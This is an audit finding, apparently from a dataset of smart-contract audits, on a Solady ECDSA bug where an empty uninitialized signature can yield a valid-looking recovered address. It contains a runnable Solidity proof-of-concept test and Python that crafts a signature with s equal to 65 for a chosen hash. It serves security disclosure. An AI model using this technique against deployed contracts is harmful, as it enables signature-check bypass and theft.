# [M] ECDSA: Empty signature can result in valid recovered address

## Summary
Severity: Medium
Contest weight: 0.6717
Dataset id: 6056
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
```solidity
The ECDSA.recover(bytes32, bytes memory) and ECDSA.tryRecover(bytes32, bytes memory) functions each take a hash and bytes signature argument carrying the components of an ECDSA
signature r || s || v and attempt to recover the signer's Ethereum address via the EVM's ecrecover
precompile. The only difference between the two is that recover will revert if no valid signer could be
recovered and tryRecover fails silently, returning the zero-address.
The ecrecover precompile takes 4 words (128 bytes) as input: hash || bytes31(0) || v || r || s. To
save gas on memory expansion costs, Solady's ECDSA library temporarily overwrites the memory region
0x00-0x80 (including the free memory pointer at [0x40:0x60) and the default null pointer at [0x60:0x80))
for the precompile's input. To save gas the functions ﬁrst optimistically copies the 65 bytes of the signature
from memory and then validate its length. This means that if the signature is <65 bytes long it may copy
out-of-bound data, the length check is meant to still invalidate such signatures.
There is however an edge case that is unaccounted for: uninitialized bytes memory objects. These point
to 0x60 giving them a length of zero thanks to the default null pointer. If such a signature is validated
the recover functions will copy the data at [0x80:0xc1] which may have other variables allocated. The
optimistic copy will overwrite the null pointer at 0x60 temporarily changing the implicit length to the word
at 0xa0. This can allow a non-zero address to be recovered from an empty signature.
```

## Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;
import {Test} from "forge-std/Test.sol";
import {ECDSA} from "solady/utils/ECDSA.sol";
contract ECDSAPoC is Test {
    struct NotASig {
        bytes32 r;
        bytes32 s;
        bytes1 v;
    }
    function testRecoverInvalid() public {
        bytes32 hash = 0x73139abbd176cf7f94893453632c00afefb2776f9805a21d03d176c885cd0d63;
        // Create an unrelated struct that sits in memory and happens to contain the components of a valid
        // signature.
        NotASig memory noSig = NotASig({
            r: 0x88385877e6c712ef33fbd9c82ed5f3a348bed805e701d1d9b9ff479ff65b7020,
            s: bytes32(uint256(65)),
            v: bytes1(uint8(28))
        });
        // Uninitialized bytes objects (pointer to 0x60).
        bytes memory emptySig;
        // Try to recover from empty signature
        address recovered = ECDSA.recover(hash, emptySig);
        // No revert, non-zero signer recovered.
        assertEq(recovered, 0x5776b19B163da161b8f6fD304dc1a09FA96b16A7);
    }
}
```
Note that both tryRecover and recover have the same issue, the PoC demonstrates the issue for the
recover function.
For this edge-case to be exploited in practice certain conditions must be met:
• The signature parameter must be an empty, uninitialized bytes memory variable. If created with the
syntax bytes memory signature = new bytes(0); Solidity may actually allocate memory, if the
pointer is not 0x60 the functions will correctly recognize the signatures as invalid.
• The data already in memory at [0x80:0xc1] must represent an ECDSA signature that leads to a
recovered address.
• The word at 0xa0 must be 65 so that when 0x60 is overwritten the "length" of the signature will be
that of a valid signature, this also means that the s component of the signature must be 65.
The recovered address may be a controllable EOA account (ecrecover can "recover" addresses for which
there is no valid private key for a subset of random inputs (hash, r, s, v)), if the hash can be a speciﬁcally
chosen value. This is due to how the s value is computed when generating a signature (k = secure random
integer, z = message hash, dA = private key, n = order of the point G on the curve):
```math
s = k−1(z + r · dA) mod n
```
Assuming we know the private key dA We can rearrange the above formula to ﬁnd a z such that s is 65:
```math
65 = k−1(z + r · dA) mod n
65 · k = z + r · dA mod n
65 · k − r · dA = z mod n
```
We now have a valid signature pair (r, s) for our chosen message hash z and the private key dA (v is an
added component not part of the base ECDSA algorithm chosen based on the original point coordinate
x1 and r).
Signature for real private key with s = 65 proof of concept:
"Find the full runnable PoC in the Appendix section of this report".
```python
# Private key in your control (randomly generated and public, do not use to store funds).
private_key = 0xca6e0c197892239353a097f7db686d4a0313f4316bc726bb7d8fe692f4d827ad
public_key = private_key * G
address = as_address(public_key)
print(f'address: 0x{address.hex()}')
# Random *secure integer
# Note: `randint` is not a secure number generator, only for demonstration purposes
k = randint(0, n-1)
print(f'\nk: {k}')
# Compute r & v
big_k = k * G
v = 27 + big_k.y % 2
print(f'v: {v}')
r = big_k.x % n
print(f'r: 0x{r:064x}')
s = 65
print(f's: 0x{s:064x}')
# Compute the hash `z` such that the signature `(v, r, s)` is valid for `z`
z = (s * k - r * private_key) % n
print(f'hash: 0x{z:064x}')
```

## Recommendation
Validate or at least cache the validity/length of the signature prior to optimistically
copying its contents. This will still allow the use of the memory region [0x00:0x80) while correctly handling
the empty signature edge case.
